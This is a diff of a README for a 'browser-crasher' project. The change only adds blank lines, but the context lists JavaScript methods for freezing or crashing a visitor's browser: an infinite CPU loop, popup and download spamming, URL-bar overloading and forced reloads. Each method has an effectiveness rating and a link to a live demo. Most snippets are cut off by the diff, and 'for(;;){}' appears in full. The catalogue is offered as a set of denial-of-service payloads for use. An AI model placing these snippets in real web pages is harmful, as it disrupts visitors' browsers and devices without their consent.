@@ -5,6 +5,7 @@ As practice has shown, Chromium-based browsers are more vulnerable to various at
 
 ### CPU-bound Infinite Loop 10/10
 The most reliable way to completely freeze a page. Works in any browser. Basically forces a user to close the page.
+
 [OPEN](https://murka007.github.io/browser-crasher/?type=0)
 ```js
 for(;;){}
@@ -12,6 +13,7 @@ for(;;){}
 
 ### Window Opener 2/10
 Opens multiple popups on the page and fills history, which drastically increases memory and cpu usage. Doesn't work if user has `block popups` option enabled.
+
 [OPEN](https://murka007.github.io/browser-crasher/?type=1)
 ```js
 setInterval(() => {
@@ -22,6 +24,7 @@ setInterval(() => {
 
 ### Download Popup Opener 7/10
 Almost the same method as `Window Opener`, but this approach is more consistent among all browsers.
+
 [OPEN](https://murka007.github.io/browser-crasher/?type=2)
 ```js
 const download = (text) => {
@@ -46,6 +49,7 @@ setInterval(() => {
 
 ### URL bar overloading 5/10
 Abuses `History API` and fills URL bar with insanely large values.
+
 [OPEN](https://murka007.github.io/browser-crasher/?type=3)
 ```js
 const total = "0".repeat(999999);
@@ -57,6 +61,7 @@ setInterval(() => {
 
 ### Infinite Reload Attack 1/10
 Reloads the page multiple times. Firefox has protection against it.
+
 [OPEN](https://murka007.github.io/browser-crasher/?type=4)
 ```js
 window.onbeforeunload = function() {
